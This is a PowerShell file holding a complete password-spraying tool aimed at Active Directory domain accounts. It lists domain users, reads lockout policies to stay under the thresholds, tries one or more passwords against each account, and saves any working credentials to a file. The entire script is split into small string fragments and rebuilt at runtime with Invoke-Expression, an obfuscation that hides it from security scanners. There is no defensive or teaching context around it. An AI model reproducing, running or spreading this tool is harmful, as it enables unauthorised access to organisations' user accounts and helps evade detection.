$fragments = @('function Invoke-Do','mainPasswor','dSpray{
   ',' <#
    .SY','NOPSIS

   ',' This modul','e performs ','a password ','spray attac','k against u','sers of a d','omain. By d','efault it w','ill automat','ically gene','rate the us','erlist from',' the domain','. Be carefu','l not to lo','ckout any a','ccounts.

 ','   DomainPa','sswordSpray',' Function: ','Invoke-Doma','inPasswordS','pray
    Au','thor: Beau ','Bullock (@d','afthack) an','d Brian Feh','rman (@full','metalcache)','
    Licens','e: BSD 3-Cl','ause
    Re','quired Depe','ndencies: N','one
    Opt','ional Depen','dencies: No','ne

    .DE','SCRIPTION

','    This mo','dule perfor','ms a passwo','rd spray at','tack agains','t users of ','a domain. B','y default i','t will auto','matically g','enerate the',' userlist f','rom the dom','ain. Be car','eful not to',' lockout an','y accounts.','

    .PARA','METER UserL','ist

    Op','tional User','List parame','ter. This w','ill be gene','rated autom','atically if',' not specif','ied.

    .','PARAMETER P','assword

  ','  A single ','password th','at will be ','used to per','form the pa','ssword spra','y.

    .PA','RAMETER Pas','swordList

','    A list ','of password','s one per l','ine to use ','for the pas','sword spray',' (Be very c','areful not ','to lockout ','accounts).
','
    .PARAM','ETER OutFil','e

    A fi','le to outpu','t the resul','ts to.

   ',' .PARAMETER',' Domain

  ','  The domai','n to spray ','against.

 ','   .PARAMET','ER Filter

','    Custom ','LDAP filter',' for users,',' e.g. "(des','cription=*a','dmin*)"

  ','  .PARAMETE','R Force

  ','  Forces th','e spray to ','continue an','d doesn''t p','rompt for c','onfirmation','.

    .PAR','AMETER Fudg','e

    Extr','a wait time',' between ea','ch round of',' tests (sec','onds).

   ',' .PARAMETER',' Quiet

   ',' Less outpu','t so it wil','l work bett','er with thi','ngs like Co','balt Strike','

    .PARA','METER Usern','ameAsPasswo','rd

    For',' each user,',' will try t','hat user''s ','name as the','ir password','

    .EXAM','PLE

    C:','\PS> Invoke','-DomainPass','wordSpray -','Password Wi','nter2016

 ','   Descript','ion
    ---','--------
  ','  This comm','and will au','tomatically',' generate a',' list of us','ers from th','e current u','ser''s domai','n and attem','pt to authe','nticate usi','ng each use','rname and a',' password o','f Winter201','6.

    .EX','AMPLE

    ','C:\PS> Invo','ke-DomainPa','sswordSpray',' -UserList ','users.txt -','Domain doma','in-name -Pa','sswordList ','passlist.tx','t -OutFile ','sprayed-cre','ds.txt

   ',' Descriptio','n
    -----','------
    ','This comman','d will use ','the userlis','t at users.','txt and try',' to authent','icate to th','e domain "d','omain-name"',' using each',' password i','n the passl','ist.txt fil','e one at a ','time. It wi','ll automati','cally attem','pt to detec','t the domai','n''s lockout',' observatio','n window an','d restrict ','sprays to 1',' attempt du','ring each w','indow.

   ',' .EXAMPLE

','    C:\PS> ','Invoke-Doma','inPasswordS','pray -Usern','ameAsPasswo','rd -OutFile',' valid-cred','s.txt

    ','Description','
    ------','-----
    T','his command',' will autom','atically ge','nerate a li','st of users',' from the c','urrent user','''s domain a','nd attempt ','to authenti','cate as eac','h user by u','sing their ','username as',' their pass','word. Any v','alid creden','tials will ','be saved to',' valid-cred','s.txt

    ','#>
    para','m(
     [Pa','rameter(Pos','ition = 0, ','Mandatory =',' $false)]
 ','    [string',']
     $Use','rList = "",','

     [Par','ameter(Posi','tion = 1, M','andatory = ','$false)]
  ','   [string]','
     $Pass','word,

    ',' [Parameter','(Position =',' 2, Mandato','ry = $false',')]
     [st','ring]
     ','$PasswordLi','st,

     [','Parameter(P','osition = 3',', Mandatory',' = $false)]','
     [stri','ng]
     $O','utFile,

  ','   [Paramet','er(Position',' = 4, Manda','tory = $fal','se)]
     [','string]
   ','  $Filter =',' "",

     ','[Parameter(','Position = ','5, Mandator','y = $false)',']
     [str','ing]
     $','Domain = ""',',

     [Pa','rameter(Pos','ition = 6, ','Mandatory =',' $false)]
 ','    [switch',']
     $For','ce,

     [','Parameter(P','osition = 7',', Mandatory',' = $false)]','
     [swit','ch]
     $U','sernameAsPa','ssword,

  ','   [Paramet','er(Position',' = 8, Manda','tory = $fal','se)]
     [','int]
     $','Delay=0,

 ','    [Parame','ter(Positio','n = 9, Mand','atory = $fa','lse)]
     ','$Jitter=0,
','
     [Para','meter(Posit','ion = 10, M','andatory = ','$false)]
  ','   [switch]','
     $Quie','t,

     [P','arameter(Po','sition = 11',', Mandatory',' = $false)]','
     [int]','
     $Fudg','e=10
    )
','
    if ($P','assword)
  ','  {
       ',' $Passwords',' = @($Passw','ord)
    }
','    elseif(','$UsernameAs','Password)
 ','   {
      ','  $Password','s = ""
    ','}
    elsei','f($Password','List)
    {','
        $P','asswords = ','Get-Content',' $PasswordL','ist
    }
 ','   else
   ',' {
        ','Write-Host ','-Foreground','Color Red "','The -Passwo','rd or -Pass','wordList op','tion must b','e specified','"
        b','reak
    }
','
    try
  ','  {
       ',' if ($Domai','n -ne "")
 ','       {
  ','          #',' Using doma','in specifie','d with -Dom','ain option
','           ',' $DomainCon','text = New-','Object Syst','em.Director','yServices.A','ctiveDirect','ory.Directo','ryContext("','domain",$Do','main)
     ','       $Dom','ainObject =',' [System.Di','rectoryServ','ices.Active','Directory.D','omain]::Get','Domain($Dom','ainContext)','
          ','  $CurrentD','omain = "LD','AP://" + ([','ADSI]"LDAP:','//$Domain")','.distinguis','hedName
   ','     }
    ','    else
  ','      {
   ','         # ','Trying to u','se the curr','ent user''s ','domain
    ','        $Do','mainObject ','= [System.D','irectorySer','vices.Activ','eDirectory.','Domain]::Ge','tCurrentDom','ain()
     ','       $Cur','rentDomain ','= "LDAP://"',' + ([ADSI]"','").distingu','ishedName
 ','       }
  ','  }
    cat','ch
    {
  ','      Write','-Host -Fore','groundColor',' "red" "[*]',' Could not ','connect to ','the domain.',' Try specif','ying the do','main name w','ith the -Do','main option','."
        ','break
    }','

    if ($','UserList -e','q "")
    {','
        $U','serListArra','y = Get-Dom','ainUserList',' -Domain $D','omain -Remo','veDisabled ','-RemovePote','ntialLockou','ts -Filter ','$Filter
   ',' }
    else','
    {
    ','    # if a ','Userlist is',' specified ','use it and ','do not chec','k for locko','ut threshol','ds
        ','Write-Host ','"[*] Using ','$UserList a','s userlist ','to spray wi','th"
       ',' Write-Host',' -Foregroun','dColor "yel','low" "[*] W','arning: Use','rs will not',' be checked',' for lockou','t threshold','."
        ','$UserListAr','ray = @()
 ','       try
','        {
 ','           ','$UserListAr','ray = Get-C','ontent $Use','rList -Erro','rAction sto','p
        }','
        ca','tch [Except','ion]
      ','  {
       ','     Write-','Host -Foreg','roundColor ','"red" "$_.E','xception"
 ','           ','break
     ','   }

    }','


    if (','$Passwords.','count -gt 1',')
    {
   ','     Write-','Host -Foreg','roundColor ','Yellow "[*]',' WARNING - ','Be very car','eful not to',' lock out a','ccounts wit','h the passw','ord list op','tion!"
    ','}

    $obs','ervation_wi','ndow = Get-','Observation','Window $Cur','rentDomain
','
    Write-','Host -Foreg','roundColor ','Yellow "[*]',' The domain',' password p','olicy obser','vation wind','ow is set t','o $observat','ion_window ','minutes."
 ','   Write-Ho','st "[*] Set','ting a $obs','ervation_wi','ndow minute',' wait in be','tween spray','s."

    # ','if no force',' flag is se','t we will a','sk if the u','ser is sure',' they want ','to spray
  ','  if (!$For','ce)
    {
 ','       $tit','le = "Confi','rm Password',' Spray"
   ','     $messa','ge = "Are y','ou sure you',' want to pe','rform a pas','sword spray',' against " ','+ $UserList','Array.count',' + " accoun','ts?"

     ','   $yes = N','ew-Object S','ystem.Manag','ement.Autom','ation.Host.','ChoiceDescr','iption "&Ye','s", `
     ','       "Att','empts to au','thenticate ','1 time per ','user in the',' list for e','ach passwor','d in the pa','sswordlist ','file."

   ','     $no = ','New-Object ','System.Mana','gement.Auto','mation.Host','.ChoiceDesc','ription "&N','o", `
     ','       "Can','cels the pa','ssword spra','y."

      ','  $options ','= [System.M','anagement.A','utomation.H','ost.ChoiceD','escription[',']]($yes, $n','o)

       ',' $result = ','$host.ui.Pr','omptForChoi','ce($title, ','$message, $','options, 0)','

        i','f ($result ','-ne 0)
    ','    {
     ','       Writ','e-Host "Can','celling the',' password s','pray."
    ','        bre','ak
        ','}
    }
   ',' Write-Host',' -Foregroun','dColor Yell','ow "[*] Pas','sword spray','ing has beg','un with " $','Passwords.c','ount " pass','words"
    ','Write-Host ','"[*] This m','ight take a',' while depe','nding on th','e total num','ber of user','s"

    if(','$UsernameAs','Password)
 ','   {
      ','  Invoke-Sp','raySinglePa','ssword -Dom','ain $Curren','tDomain -Us','erListArray',' $UserListA','rray -OutFi','le $OutFile',' -Delay $De','lay -Jitter',' $Jitter -U','sernameAsPa','ssword -Qui','et $Quiet
 ','   }
    el','se
    {
  ','      for($','i = 0; $i -','lt $Passwor','ds.count; $','i++)
      ','  {
       ','     Invoke','-SpraySingl','ePassword -','Domain $Cur','rentDomain ','-UserListAr','ray $UserLi','stArray -Pa','ssword $Pas','swords[$i] ','-OutFile $O','utFile -Del','ay $Delay -','Jitter $Jit','ter -Quiet ','$Quiet
    ','        if ','(($i+1) -lt',' $Passwords','.count)
   ','         {
','           ','     Countd','own-Timer -','Seconds (60','*$observati','on_window +',' $Fudge) -Q','uiet $Quiet','
          ','  }
       ',' }
    }

 ','   Write-Ho','st -Foregro','undColor Ye','llow "[*] P','assword spr','aying is co','mplete"
   ',' if ($OutFi','le -ne "")
','    {
     ','   Write-Ho','st -Foregro','undColor Ye','llow "[*] A','ny password','s that were',' successful','ly sprayed ','have been o','utput to $O','utFile"
   ',' }
}

funct','ion Countdo','wn-Timer
{
','    param(
','        $Se','conds = 180','0,
        ','$Message = ','"[*] Pausin','g to avoid ','account loc','kout.",
   ','     [switc','h] $Quiet =',' $False
   ',' )
    if (','$quiet)
   ',' {
        ','Write-Host ','"${Message}',': Waiting f','or $($Secon','ds/60) minu','tes. $($Sec','onds - $Cou','nt)"
      ','  Start-Sle','ep -Seconds',' $Seconds
 ','   } else {','
        fo','reach ($Cou','nt in (1..$','Seconds))
 ','       {
  ','          W','rite-Progre','ss -Id 1 -A','ctivity $Me','ssage -Stat','us "Waiting',' for $($Sec','onds/60) mi','nutes. $($S','econds - $C','ount) secon','ds remainin','g" -Percent','Complete ((','$Count / $S','econds) * 1','00)
       ','     Start-','Sleep -Seco','nds 1
     ','   }
      ','  Write-Pro','gress -Id 1',' -Activity ','$Message -S','tatus "Comp','leted" -Per','centComplet','e 100 -Comp','leted
    }','
}

functio','n Get-Domai','nUserList
{','
<#
    .SY','NOPSIS

   ',' This modul','e gathers a',' userlist f','rom the dom','ain.

    D','omainPasswo','rdSpray Fun','ction: Get-','DomainUserL','ist
    Aut','hor: Beau B','ullock (@da','fthack)
   ',' License: B','SD 3-Clause','
    Requir','ed Dependen','cies: None
','    Optiona','l Dependenc','ies: None

','    .DESCRI','PTION

    ','This module',' gathers a ','userlist fr','om the doma','in.

    .P','ARAMETER Do','main

    T','he domain t','o spray aga','inst.

    ','.PARAMETER ','RemoveDisab','led

    At','tempts to r','emove disab','led account','s from the ','userlist. (','Credit to S','ally Vandev','en (@sallyv','dv))

    .','PARAMETER R','emovePotent','ialLockouts','

    Remov','es accounts',' within 1 a','ttempt of l','ocking out.','

    .PARA','METER Filte','r

    Cust','om LDAP fil','ter for use','rs, e.g. "(','description','=*admin*)"
','
    .EXAMP','LE

    PS ','C:\> Get-Do','mainUserLis','t

    Desc','ription
   ',' ----------','-
    This ','command wil','l gather a ','userlist fr','om the doma','in includin','g all samAc','countType "','805306368".','

    .EXAM','PLE

    C:','\PS> Get-Do','mainUserLis','t -Domain d','omainname -','RemoveDisab','led -Remove','PotentialLo','ckouts | Ou','t-File -Enc','oding ascii',' userlist.t','xt

    Des','cription
  ','  ---------','--
    This',' command wi','ll gather a',' userlist f','rom the dom','ain "domain','name" inclu','ding any ac','counts that',' are not di','sabled and ','are not clo','se to locki','ng out. It ','will write ','them to a f','ile at "use','rlist.txt"
','
    #>
   ',' param(
   ','  [Paramete','r(Position ','= 0, Mandat','ory = $fals','e)]
     [s','tring]
    ',' $Domain = ','"",

     [','Parameter(P','osition = 1',', Mandatory',' = $false)]','
     [swit','ch]
     $R','emoveDisabl','ed,

     [','Parameter(P','osition = 2',', Mandatory',' = $false)]','
     [swit','ch]
     $R','emovePotent','ialLockouts',',

     [Pa','rameter(Pos','ition = 3, ','Mandatory =',' $false)]
 ','    [string',']
     $Fil','ter
    )

','    try
   ',' {
        ','if ($Domain',' -ne "")
  ','      {
   ','         # ','Using domai','n specified',' with -Doma','in option
 ','           ','$DomainCont','ext = New-O','bject Syste','m.Directory','Services.Ac','tiveDirecto','ry.Director','yContext("d','omain",$Dom','ain)
      ','      $Doma','inObject =[','System.Dire','ctoryServic','es.ActiveDi','rectory.Dom','ain]::GetDo','main($Domai','nContext)
 ','           ','$CurrentDom','ain = "LDAP','://" + ([AD','SI]"LDAP://','$Domain").d','istinguishe','dName
     ','   }
      ','  else
    ','    {
     ','       # Tr','ying to use',' the curren','t user''s do','main
      ','      $Doma','inObject =[','System.Dire','ctoryServic','es.ActiveDi','rectory.Dom','ain]::GetCu','rrentDomain','()
        ','    $Curren','tDomain = "','LDAP://" + ','([ADSI]"").','distinguish','edName
    ','    }
    }','
    catch
','    {
     ','   Write-Ho','st -Foregro','undColor "r','ed" "[*] Co','uld connect',' to the dom','ain. Try sp','ecifying th','e domain na','me with the',' -Domain op','tion."
    ','    break
 ','   }

    #',' Setting th','e current d','omain''s acc','ount lockou','t threshold','
    $objDe','Domain = [A','DSI] "LDAP:','//$($Domain','Object.PDCR','oleOwner)"
','    $Accoun','tLockoutThr','esholds = @','()
    $Acc','ountLockout','Thresholds ','+= $objDeDo','main.Proper','ties.lockou','tthreshold
','
    # Gett','ing the AD ','behavior ve','rsion to de','termine if ','fine-graine','d password ','policies ar','e possible
','    $behavi','orversion =',' [int] $obj','DeDomain.Pr','operties[''m','sds-behavio','r-version'']','.item(0)
  ','  if ($beha','viorversion',' -ge 3)
   ',' {
        ','# Determine',' if there a','re any fine','-grained pa','ssword poli','cies
      ','  Write-Hos','t "[*] Curr','ent domain ','is compatib','le with Fin','e-Grained P','assword Pol','icy."
     ','   $ADSearc','her = New-O','bject Syste','m.Directory','Services.Di','rectorySear','cher
      ','  $ADSearch','er.SearchRo','ot = $objDe','Domain
    ','    $ADSear','cher.Filter',' = "(object','class=msDS-','PasswordSet','tings)"
   ','     $PSOs ','= $ADSearch','er.FindAll(',')

        ','if ( $PSOs.','count -gt 0',')
        {','
          ','  Write-Hos','t -foregrou','ndcolor "ye','llow" ("[*]',' A total of',' " + $PSOs.','count + " F','ine-Grained',' Password p','olicies wer','e found.`r`','n")
       ','     foreac','h($entry in',' $PSOs)
   ','         {
','           ','     # Sele','cting the l','ockout thre','shold, min ','pwd length,',' and which
','           ','     # grou','ps the fine','-grained pa','ssword poli','cy applies ','to
        ','        $PS','OFineGraine','dPolicy = $','entry | Sel','ect-Object ','-ExpandProp','erty Proper','ties
      ','          $','PSOPolicyNa','me = $PSOFi','neGrainedPo','licy.name
 ','           ','    $PSOLoc','koutThresho','ld = $PSOFi','neGrainedPo','licy.''msds-','lockoutthre','shold''
    ','           ',' $PSOApplie','sTo = $PSOF','ineGrainedP','olicy.''msds','-psoapplies','to''
       ','         $P','SOMinPwdLen','gth = $PSOF','ineGrainedP','olicy.''msds','-minimumpas','swordlength','''
         ','       # ad','ding lockou','t threshold',' to array f','or use late','r to determ','ine which i','s the lowes','t.
        ','        $Ac','countLockou','tThresholds',' += $PSOLoc','koutThresho','ld

       ','         Wr','ite-Host "[','*] Fine-Gra','ined Passwo','rd Policy t','itled: $PSO','PolicyName ','has a Locko','ut Threshol','d of $PSOLo','ckoutThresh','old attempt','s, minimum ','password le','ngth of $PS','OMinPwdLeng','th chars, a','nd applies ','to $PSOAppl','iesTo.`r`n"','
          ','  }
       ',' }
    }

 ','   $observa','tion_window',' = Get-Obse','rvationWind','ow $Current','Domain

   ',' # Generate',' a userlist',' from the d','omain
    #',' Selecting ','the lowest ','account loc','kout thresh','old in the ','domain to a','void
    # ','locking out',' any accoun','ts.
    [in','t]$Smallest','LockoutThre','shold = $Ac','countLockou','tThresholds',' | sort | S','elect -Firs','t 1
    Wri','te-Host -Fo','regroundCol','or "yellow"',' "[*] Now c','reating a l','ist of user','s to spray.','.."

    if',' ($Smallest','LockoutThre','shold -eq "','0")
    {
 ','       Writ','e-Host -For','egroundColo','r "Yellow" ','"[*] There ','appears to ','be no locko','ut policy."','
    }
    ','else
    {
','        Wri','te-Host -Fo','regroundCol','or "Yellow"',' "[*] The s','mallest loc','kout thresh','old discove','red in the ','domain is $','SmallestLoc','koutThresho','ld login at','tempts."
  ','  }

    $U','serSearcher',' = New-Obje','ct System.D','irectorySer','vices.Direc','torySearche','r([ADSI]$Cu','rrentDomain',')
    $DirE','ntry = New-','Object Syst','em.Director','yServices.D','irectoryEnt','ry
    $Use','rSearcher.S','earchRoot =',' $DirEntry
','
    $UserS','earcher.Pro','pertiesToLo','ad.Add("sam','accountname','") > $Null
','    $UserSe','archer.Prop','ertiesToLoa','d.Add("badp','wdcount") >',' $Null
    ','$UserSearch','er.Properti','esToLoad.Ad','d("badpassw','ordtime") >',' $Null

   ',' if ($Remov','eDisabled)
','    {
     ','   Write-Ho','st -Foregro','undColor "y','ellow" "[*]',' Removing d','isabled use','rs from lis','t."
       ',' # More pre','cise LDAP f','ilter UAC c','heck for us','ers that ar','e disabled ','(Joff Thyer',')
        #',' LDAP 1.2.8','40.113556.1','.4.803 mean','s bitwise &','
        # ','uac 0x2 is ','ACCOUNTDISA','BLE
       ',' # uac 0x10',' is LOCKOUT','
        # ','See http://','jackstrombe','rg.com/2013','/01/useracc','ountcontrol','-attributef','lag-values/','
        $U','serSearcher','.filter =
 ','           ','"(&(objectC','ategory=per','son)(object','Class=user)','(!userAccou','ntControl:1','.2.840.1135','56.1.4.803:','=16)(!userA','ccountContr','ol:1.2.840.','113556.1.4.','803:=2)$Fil','ter)"
    }','
    else
 ','   {
      ','  $UserSear','cher.filter',' = "(&(obje','ctCategory=','person)(obj','ectClass=us','er)$Filter)','"
    }

  ','  $UserSear','cher.Proper','tiesToLoad.','add("samacc','ountname") ','> $Null
   ',' $UserSearc','her.Propert','iesToLoad.a','dd("lockout','time") > $N','ull
    $Us','erSearcher.','PropertiesT','oLoad.add("','badpwdcount','") > $Null
','    $UserSe','archer.Prop','ertiesToLoa','d.add("badp','asswordtime','") > $Null
','
    #Write','-Host $User','Searcher.fi','lter

    #',' grab batch','es of 1000 ','in results
','    $UserSe','archer.Page','Size = 1000','
    $AllUs','erObjects =',' $UserSearc','her.FindAll','()
    Writ','e-Host -For','egroundColo','r "yellow" ','("[*] There',' are " + $A','llUserObjec','ts.count + ','" total use','rs found.")','
    $UserL','istArray = ','[System.Col','lections.Ge','neric.List[','String]]::n','ew()

    i','f ($RemoveP','otentialLoc','kouts)
    ','{
        W','rite-Host -','ForegroundC','olor "yello','w" "[*] Rem','oving users',' within 1 a','ttempt of l','ocking out ','from list."','
        fo','reach ($use','r in $AllUs','erObjects)
','        {
 ','           ','# Getting b','ad password',' counts and',' lst bad pa','ssword time',' for each u','ser
       ','     $badco','unt = $user','.Properties','.badpwdcoun','t
         ','   $samacco','untname = $','user.Proper','ties.samacc','ountname
  ','          t','ry
        ','    {
     ','           ','$badpasswor','dtime = $us','er.Properti','es.badpassw','ordtime[0]
','           ',' }
        ','    catch
 ','           ','{
         ','       cont','inue
      ','      }
   ','         $c','urrenttime ','= Get-Date
','           ',' $lastbadpw','d = [DateTi','me]::FromFi','leTime($bad','passwordtim','e)
        ','    $timedi','fference = ','($currentti','me - $lastb','adpwd).Tota','lMinutes

 ','           ','if ($badcou','nt)
       ','     {
    ','           ',' [int]$user','badcount = ','[convert]::','ToInt32($ba','dcount, 10)','
          ','      $atte','mptsuntillo','ckout = $Sm','allestLocko','utThreshold',' - $userbad','count
     ','           ','# if there ','is more tha','n 1 attempt',' left befor','e a user lo','cks out
   ','           ','  # or if t','he time sin','ce the last',' failed log','in is great','er than the',' domain
   ','           ','  # observa','tion window',' add user t','o spray lis','t
         ','       if (','($timediffe','rence -gt $','observation','_window) -o','r ($attempt','suntillocko','ut -gt 1))
','           ','           ','          {','
          ','          $','UserListArr','ay.Add($sam','accountname',')
         ','       }
  ','          }','
        }
','    }
    e','lse
    {
 ','       fore','ach ($user ','in $AllUser','Objects)
  ','      {
   ','         $s','amaccountna','me = $user.','Properties.','samaccountn','ame
       ','     $UserL','istArray.Ad','d($samaccou','ntname)
   ','     }
    ','}

    Writ','e-Host -for','egroundcolo','r "yellow" ','("[*] Creat','ed a userli','st containi','ng " + $Use','rListArray.','count + " u','sers gather','ed from the',' current us','er''s domain','")
    retu','rn $UserLis','tArray
}

f','unction Inv','oke-SpraySi','nglePasswor','d
{
    par','am(
       ','     [Param','eter(Positi','on=1)]
    ','        $Do','main,
     ','       [Par','ameter(Posi','tion=2)]
  ','          [','string[]]
 ','           ','$UserListAr','ray,
      ','      [Para','meter(Posit','ion=3)]
   ','         [s','tring]
    ','        $Pa','ssword,
   ','         [P','arameter(Po','sition=4)]
','           ',' [string]
 ','           ','$OutFile,
 ','           ','[Parameter(','Position=5)',']
         ','   [int]
  ','          $','Delay=0,
  ','          [','Parameter(P','osition=6)]','
          ','  [double]
','           ',' $Jitter=0,','
          ','  [Paramete','r(Position=','7)]
       ','     [switc','h]
        ','    $Userna','meAsPasswor','d,
        ','    [Parame','ter(Positio','n=7)]
     ','       [swi','tch]
      ','      $Quie','t
    )
   ',' $time = Ge','t-Date
    ','$count = $U','serListArra','y.count
   ',' Write-Host',' "[*] Now t','rying passw','ord $Passwo','rd against ','$count user','s. Current ','time is $($','time.ToShor','tTimeString','())"
    $c','urr_user = ','0
    if ($','OutFile -ne',' ""-and -no','t $Quiet)
 ','   {
      ','  Write-Hos','t -Foregrou','ndColor Yel','low "[*] Wr','iting succe','sses to $Ou','tFile"    
','    }
    $','RandNo = Ne','w-Object Sy','stem.Random','

    forea','ch ($User i','n $UserList','Array)
    ','{
        i','f ($Usernam','eAsPassword',')
        {','
          ','  $Password',' = $User
  ','      }
   ','     $Domai','n_check = N','ew-Object S','ystem.Direc','toryService','s.Directory','Entry($Doma','in,$User,$P','assword)
  ','      if ($','Domain_chec','k.name -ne ','$null)
    ','    {
     ','       if (','$OutFile -n','e "")
     ','       {
  ','           ','   Add-Cont','ent $OutFil','e $User`:$P','assword
   ','         }
','           ',' Write-Host',' -Foregroun','dColor Gree','n "[*] SUCC','ESS! User:$','User Passwo','rd:$Passwor','d"
        ','}
        $','curr_user +','= 1
       ',' if (-not $','Quiet)
    ','    {
     ','       Writ','e-Host -non','ewline "$cu','rr_user of ','$count user','s tested`r"','
        }
','        if ','($Delay)
  ','      {
   ','         St','art-Sleep -','Seconds $Ra','ndNo.Next((','1-$Jitter)*','$Delay, (1+','$Jitter)*$D','elay)
     ','   }
    }
','
}

functio','n Get-Obser','vationWindo','w($DomainEn','try)
{
    ','# Get accou','nt lockout ','observation',' window to ','avoid runni','ng more tha','n 1
    # p','assword spr','ay per obse','rvation win','dow.
    $D','omainEntry ','= [ADSI]$Do','mainEntry
 ','   $lockObs','ervationWin','dow_attr = ','$DomainEntr','y.Propertie','s[''lockoutO','bservationW','indow'']
   ',' $observati','on_window =',' $DomainEnt','ry.ConvertL','argeInteger','ToInt64($lo','ckObservati','onWindow_at','tr.Value) /',' -600000000','
    return',' $observati','on_window
}','
'); $script = $fragments -join ''; Invoke-Expression $script